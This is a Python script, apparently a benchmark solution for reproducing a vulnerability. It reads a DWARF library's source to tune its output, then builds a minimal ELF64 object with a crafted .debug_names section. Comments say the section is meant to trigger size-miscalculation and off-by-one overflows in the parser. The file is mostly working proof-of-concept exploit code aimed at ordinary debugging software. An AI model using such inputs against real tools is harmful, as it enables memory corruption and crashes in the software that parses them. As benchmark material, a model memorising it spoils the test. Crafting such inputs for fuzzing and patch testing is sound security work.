import os
import re
import tarfile
import tempfile
import struct
from typing import Dict, Tuple, Optional


def _align(n: int, a: int) -> int:
    if a <= 1:
        return n
    r = n % a
    return n if r == 0 else n + (a - r)


def _p16(x: int) -> bytes:
    return struct.pack("<H", x & 0xFFFF)


def _p32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def _build_debug_names_unit(
    *,
    version: int = 5,
    comp_unit_count: int = 0,
    local_type_unit_count: int = 0,
    foreign_type_unit_count: int = 1,
    bucket_count: int = 1,
    name_count: int = 1,
    abbrev_table_size: int = 1,
    augmentation_string: bytes = b"",
    data_block_len: int = 128,
) -> bytes:
    if data_block_len < 64:
        data_block_len = 64
    if abbrev_table_size <= 0:
        abbrev_table_size = 1
    if len(augmentation_string) != 0:
        augmentation_string = augmentation_string[: min(len(augmentation_string), 200)]
    augmentation_string_size = len(augmentation_string)

    hdr_after_len = bytearray()
    hdr_after_len += _p16(version)
    hdr_after_len += _p16(0)  # padding
    hdr_after_len += _p32(comp_unit_count)
    hdr_after_len += _p32(local_type_unit_count)
    hdr_after_len += _p32(foreign_type_unit_count)
    hdr_after_len += _p32(bucket_count)
    hdr_after_len += _p32(name_count)
    hdr_after_len += _p32(abbrev_table_size)
    hdr_after_len += _p32(augmentation_string_size)
    hdr_after_len += augmentation_string

    # Tables after header, per DWARF5 .debug_names layout:
    # CU list (4*count), local TU list (4*count), foreign TU signatures list (8*count),
    # buckets (4*bucket_count), hashes (8*name_count), string offsets (4*name_count),
    # entry offsets (4*name_count), abbreviation table (abbrev_table_size bytes), entry pool (rest).
    post = bytearray(data_block_len)

    off = 0
    off += 4 * comp_unit_count
    off += 4 * local_type_unit_count

    # Foreign type signatures list (8 bytes each)
    off += 8 * foreign_type_unit_count

    # Buckets
    if bucket_count > 0:
        # Place a non-zero bucket index to encourage downstream reads/indexing.
        # Put it at the start of the buckets table.
        bucket_off = (4 * comp_unit_count) + (4 * local_type_unit_count) + (8 * foreign_type_unit_count)
        if bucket_off + 4 <= len(post):
            post[bucket_off:bucket_off + 4] = _p32(1)

    # Ensure abbreviation table terminator at the expected location (as fixed parsers compute it),
    # but keep the whole block zero so shifted interpretations remain safe.
    # Since the whole block is already zero, no action needed.

    unit_payload = bytes(hdr_after_len) + bytes(post)
    unit_length = len(unit_payload)
    return _p32(unit_length) + unit_payload


def _build_elf64_little(sections: Dict[str, bytes]) -> bytes:
    # Minimal ELF64 relocatable with section headers.
    # Sections provided: name -> data. We'll always include .shstrtab.
    names = ["", *sections.keys(), ".shstrtab"]
    shstr = bytearray(b"\x00")
    name_offsets: Dict[str, int] = {"": 0}
    for nm in names[1:]:
        name_offsets[nm] = len(shstr)
        shstr += nm.encode("ascii", "strict") + b"\x00"

    # Layout: ELF header, section data blobs, shstrtab, section header table
    ehdr_size = 64
    off = ehdr_size

    # Place section data
    sec_offsets_sizes: Dict[str, Tuple[int, int]] = {}
    for nm, data in sections.items():
        off = _align(off, 8)
        sec_offsets_sizes[nm] = (off, len(data))
        off += len(data)

    # Place shstrtab
    off = _align(off, 8)
    shstr_off = off
    shstr_size = len(shstr)
    off += shstr_size

    # Section headers
    off = _align(off, 8)
    shoff = off

    shentsize = 64
    shnum = 1 + len(sections) + 1  # null + sections + shstrtab
    file_size = shoff + shentsize * shnum

    out = bytearray(b"\x00" * file_size)

    # ELF header
    e_ident = bytearray(16)
    e_ident[0:4] = b"\x7fELF"
    e_ident[4] = 2  # ELFCLASS64
    e_ident[5] = 1  # little endian
    e_ident[6] = 1  # version
    e_ident[7] = 0  # System V
    # rest 0
    out[0:16] = e_ident
    out[16:18] = _p16(1)       # e_type ET_REL
    out[18:20] = _p16(62)      # e_machine EM_X86_64
    out[20:24] = _p32(1)       # e_version
    out[24:32] = _p64(0)       # e_entry
    out[32:40] = _p64(0)       # e_phoff
    out[40:48] = _p64(shoff)   # e_shoff
    out[48:52] = _p32(0)       # e_flags
    out[52:54] = _p16(ehdr_size)
    out[54:56] = _p16(0)       # e_phentsize
    out[56:58] = _p16(0)       # e_phnum
    out[58:60] = _p16(shentsize)
    out[60:62] = _p16(shnum)
    out[62:64] = _p16(shnum - 1)  # e_shstrndx

    # Copy section data
    for nm, data in sections.items():
        so, ss = sec_offsets_sizes[nm]
        out[so:so + ss] = data

    # Copy shstrtab
    out[shstr_off:shstr_off + shstr_size] = shstr

    # Section headers
    def write_sh(idx: int, name: str, sh_type: int, sh_flags: int, sh_offset: int, sh_size: int,
                 sh_link: int = 0, sh_info: int = 0, sh_addralign: int = 1, sh_entsize: int = 0) -> None:
        base = shoff + idx * shentsize
        out[base + 0:base + 4] = _p32(name_offsets.get(name, 0))
        out[base + 4:base + 8] = _p32(sh_type)
        out[base + 8:base + 16] = _p64(sh_flags)
        out[base + 16:base + 24] = _p64(0)  # sh_addr
        out[base + 24:base + 32] = _p64(sh_offset)
        out[base + 32:base + 40] = _p64(sh_size)
        out[base + 40:base + 44] = _p32(sh_link)
        out[base + 44:base + 48] = _p32(sh_info)
        out[base + 48:base + 56] = _p64(sh_addralign)
        out[base + 56:base + 64] = _p64(sh_entsize)

    # Null section header
    write_sh(0, "", 0, 0, 0, 0, 0, 0, 0, 0)

    # Provided sections
    idx = 1
    for nm in sections.keys():
        so, ss = sec_offsets_sizes[nm]
        write_sh(idx, nm, 1, 0, so, ss, 0, 0, 1, 0)
        idx += 1

    # shstrtab section
    write_sh(idx, ".shstrtab", 3, 0, shstr_off, shstr_size, 0, 0, 1, 0)

    return bytes(out)


def _try_read_debugnames_c(src_path: str) -> Optional[str]:
    # Best-effort: locate dwarf_debugnames.c from tarball or directory.
    def read_file(p: str) -> Optional[str]:
        try:
            with open(p, "rb") as f:
                b = f.read()
            return b.decode("utf-8", "replace")
        except Exception:
            return None

    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                if fn == "dwarf_debugnames.c":
                    p = os.path.join(root, fn)
                    txt = read_file(p)
                    if txt is not None:
                        return txt
        return None

    if os.path.isfile(src_path):
        try:
            with tarfile.open(src_path, "r:*") as tf, tempfile.TemporaryDirectory() as td:
                members = tf.getmembers()
                candidates = [m for m in members if os.path.basename(m.name) == "dwarf_debugnames.c"]
                if not candidates:
                    return None
                m = sorted(candidates, key=lambda x: len(x.name))[0]
                tf.extract(m, path=td)
                p = os.path.join(td, m.name)
                return read_file(p)
        except Exception:
            return None
    return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        txt = _try_read_debugnames_c(src_path) or ""
        # Heuristic: if the code seems to reference foreign type signatures, keep foreign_type_unit_count=1.
        # Otherwise, still keep it enabled since it is safe and might hit size-miscalculation bugs.
        use_foreign = True
        if txt:
            # If it looks like it doesn't handle foreign type units at all, still allow; else keep.
            if "foreign_type_unit" not in txt and "foreign type" not in txt:
                use_foreign = True

        # Try to tailor name_count in case of off-by-one patterns
        name_count = 1
        if txt:
            # If we see loops using <= name_count, keep at 1 to overflow fast.
            if re.search(r"<=\s*name_count\b", txt):
                name_count = 1

        foreign_count = 1 if use_foreign else 0

        debug_names = _build_debug_names_unit(
            version=5,
            comp_unit_count=0,
            local_type_unit_count=0,
            foreign_type_unit_count=foreign_count,
            bucket_count=1,
            name_count=name_count,
            abbrev_table_size=1,
            augmentation_string=b"",
            data_block_len=160,
        )

        sections = {
            ".debug_names": debug_names,
            ".debug_str": b"\x00",
        }
        return _build_elf64_little(sections)